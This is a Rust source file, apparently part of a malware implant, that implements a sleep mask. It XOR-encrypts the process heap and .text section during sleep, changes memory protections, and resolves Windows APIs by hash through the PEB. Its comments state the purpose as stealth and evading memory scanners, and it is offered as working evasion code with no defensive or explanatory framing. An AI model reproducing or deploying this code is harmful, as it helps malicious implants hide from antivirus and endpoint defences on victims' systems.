#[cfg(not(target_os = "windows"))]
use super::syscalls::{sys_nanosleep, Timespec};

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};

static mut SLEEP_MASK_KEY: u8 = 0xAA;

/// Performs a stealthy sleep with heap and text obfuscation.
pub fn sleep(ms: u64) {
    // Generate new random key for this sleep cycle
    unsafe {
        *core::ptr::addr_of_mut!(SLEEP_MASK_KEY) = get_random_u8();
    }

    // Obfuscation: Encrypt heap memory to evade scanners during sleep
    encrypt_heap();
    
    // Obfuscation: Encrypt .text section (Sleep Mask)
    encrypt_text();

    #[cfg(target_os = "windows")]
    unsafe {
        let (base, size) = get_heap_range();
        // Change heap to NOACCESS
        set_memory_protection(base, size, 0x01); // PAGE_NOACCESS
    }

    #[cfg(not(target_os = "windows"))]
    {
        let req = Timespec {
            tv_sec: (ms / 1000) as i64,
            tv_nsec: ((ms % 1000) * 1_000_000) as i64,
        };
        unsafe {
            sys_nanosleep(&req, core::ptr::null_mut());
        }
    }

    #[cfg(target_os = "windows")]
    {
        unsafe {
            let k32_hash = hash_str(b"KERNEL32.DLL");
            let sleep_hash = hash_str(b"Sleep");
            let fn_sleep = resolve_function(k32_hash, sleep_hash);

            if !fn_sleep.is_null() {
                type SleepFn = unsafe extern "system" fn(u32);
                let sleep: SleepFn = core::mem::transmute(fn_sleep);
                sleep(ms as u32);
            }

            let (base, size) = get_heap_range();
            // Restore heap protection
            set_memory_protection(base, size, 0x04); // PAGE_READWRITE
        }
    }

    decrypt_text();
    decrypt_heap();
}

#[cfg(target_os = "windows")]
unsafe fn set_memory_protection(base: *mut u8, size: usize, protect: u32) {
    let k32_hash = hash_str(b"KERNEL32.DLL");
    let vp_hash = hash_str(b"VirtualProtect");
    let fn_vp = resolve_function(k32_hash, vp_hash);
    if !fn_vp.is_null() {
        type VirtualProtectFn = unsafe extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32;
        let virtual_protect: VirtualProtectFn = core::mem::transmute(fn_vp);
        let mut old = 0;
        virtual_protect(base, size, protect, &mut old);
    }
}

pub fn encrypt_heap() {
    let (heap_start, heap_size) = get_heap_range();
    unsafe {
        let key = *core::ptr::addr_of!(SLEEP_MASK_KEY);
        for i in 0..heap_size {
            let ptr = heap_start.add(i);
            // XOR encryption
            *ptr ^= key;
        }
    }
}

pub fn decrypt_heap() {
    encrypt_heap(); // XOR is symmetric
}

pub fn encrypt_text() {
    let (text_start, text_size) = get_text_range();
    if text_start.is_null() || text_size == 0 { return; }

    #[cfg(target_os = "windows")]
    unsafe {
        set_memory_protection(text_start, text_size, 0x04); // PAGE_READWRITE
    }
    #[cfg(not(target_os = "windows"))]
    unsafe {
        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01 | 0x02); // PROT_READ | PROT_WRITE
    }

    unsafe {
        let key = *core::ptr::addr_of!(SLEEP_MASK_KEY);
        // Skip current instruction pointer to avoid self-encryption issues
        // Simplified: we encrypt the whole section but in a real ROP chain we'd be outside
        for i in 0..text_size {
            let ptr = text_start.add(i);
            *ptr ^= key;
        }
    }

    #[cfg(target_os = "windows")]
    unsafe {
        set_memory_protection(text_start, text_size, 0x02); // PAGE_READONLY
    }
    #[cfg(not(target_os = "windows"))]
    unsafe {
        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01); // PROT_READ
    }
}

pub fn decrypt_text() {
    let (text_start, text_size) = get_text_range();
    if text_start.is_null() || text_size == 0 { return; }

    #[cfg(target_os = "windows")]
    unsafe {
        set_memory_protection(text_start, text_size, 0x04); // PAGE_READWRITE
    }
    #[cfg(not(target_os = "windows"))]
    unsafe {
        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01 | 0x02); // PROT_READ | PROT_WRITE
    }

    unsafe {
        let key = *core::ptr::addr_of!(SLEEP_MASK_KEY);
        for i in 0..text_size {
            let ptr = text_start.add(i);
            *ptr ^= key;
        }
    }

    #[cfg(target_os = "windows")]
    unsafe {
        set_memory_protection(text_start, text_size, 0x20); // PAGE_EXECUTE_READ
    }
    #[cfg(not(target_os = "windows"))]
    unsafe {
        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01 | 0x04); // PROT_READ | PROT_EXEC
    }
}

fn get_text_range() -> (*mut u8, usize) {
    #[cfg(target_os = "windows")]
    unsafe {
        let peb = crate::utils::api_resolver::get_peb();
        if peb.is_null() { return (core::ptr::null_mut(), 0); }
        let base = (*peb).ImageBaseAddress;
        
        let dos_header = base as *const IMAGE_DOS_HEADER;
        let nt_headers = (base as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        
        // Iterate sections to find ".text"
        let num_sections = (*nt_headers).FileHeader.NumberOfSections;
        let mut section_header_ptr = (nt_headers as usize + core::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const SectionHeader;
        
        for _ in 0..num_sections {
            let section = &*section_header_ptr;
            if section.name.starts_with(b".text") {
                let text_rva = section.virtual_address;
                let text_size = section.virtual_size;
                return ((base as usize + text_rva as usize) as *mut u8, text_size as usize);
            }
            section_header_ptr = section_header_ptr.add(1);
        }
        
        // Fallback: first section
        let section_header_ptr = (nt_headers as usize + core::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const SectionHeader;
        let text_rva = (*section_header_ptr).virtual_address;
        let text_size = (*section_header_ptr).virtual_size;
        
        return ((base as usize + text_rva as usize) as *mut u8, text_size as usize);
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        // On Linux, use standard base 0x400000 and a reasonable size for now
        // In full impl, we'd parse ELF headers or use linker symbols
        (0x400000 as *mut u8, 0x10000)
    }
}

#[cfg(target_os = "windows")]
#[repr(C, packed)]
struct SectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_line_numbers: u32,
    number_of_relocations: u16,
    number_of_line_numbers: u16,
    characteristics: u32,
}

fn get_random_u8() -> u8 {
    let mut val: u64 = 0;
    unsafe {
        core::arch::asm!(
            "rdrand {}",
            out(reg) val,
            options(nomem, nostack)
        );
    }
    (val & 0xFF) as u8
}

pub fn get_heap_range() -> (*mut u8, usize) {
    #[cfg(target_os = "windows")]
    unsafe {
        let kernel32 = hash_str(b"kernel32.dll");
        let get_process_heap = resolve_function(kernel32, hash_str(b"GetProcessHeap"));
        let virtual_query = resolve_function(kernel32, hash_str(b"VirtualQuery"));
        
        if !get_process_heap.is_null() && !virtual_query.is_null() {
            type FnGetProcessHeap = unsafe extern "system" fn() -> crate::utils::windows_definitions::HANDLE;
            let heap = core::mem::transmute::<_, FnGetProcessHeap>(get_process_heap)();
            
            type FnVirtualQuery = unsafe extern "system" fn(*const core::ffi::c_void, *mut crate::utils::windows_definitions::MEMORY_BASIC_INFORMATION, usize) -> usize;
            let query: FnVirtualQuery = core::mem::transmute(virtual_query);
            
            let mut mbi: crate::utils::windows_definitions::MEMORY_BASIC_INFORMATION = core::mem::zeroed();
            if query(heap, &mut mbi, core::mem::size_of::<crate::utils::windows_definitions::MEMORY_BASIC_INFORMATION>()) != 0 {
                return (heap as *mut u8, mbi.RegionSize);
            }
        }
    }
    
    #[cfg(not(target_os = "windows"))]
    unsafe {
        let path = "/proc/self/maps\0";
        let fd = crate::utils::syscalls::sys_open(path.as_ptr(), 0, 0);
        if (fd as isize) > 0 {
            let mut buf = [0u8; 4096];
            let n = crate::utils::syscalls::sys_read(fd as usize, buf.as_mut_ptr(), 4096);
            crate::utils::syscalls::sys_close(fd as usize);
            
            if n > 0 {
                if let Ok(s) = core::str::from_utf8(&buf[..n]) {
                    for line in s.lines() {
                        if line.contains("[heap]") {
                            let mut parts = line.split_whitespace();
                            if let Some(range) = parts.next() {
                                let mut range_parts = range.split('-');
                                if let (Some(start_str), Some(end_str)) = (range_parts.next(), range_parts.next()) {
                                    let start = usize::from_str_radix(start_str, 16).unwrap_or(0);
                                    let end = usize::from_str_radix(end_str, 16).unwrap_or(0);
                                    if start > 0 && end > start {
                                        return (start as *mut u8, end - start);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // Fallback
    (0x10000000 as *mut u8, 1024 * 1024)
}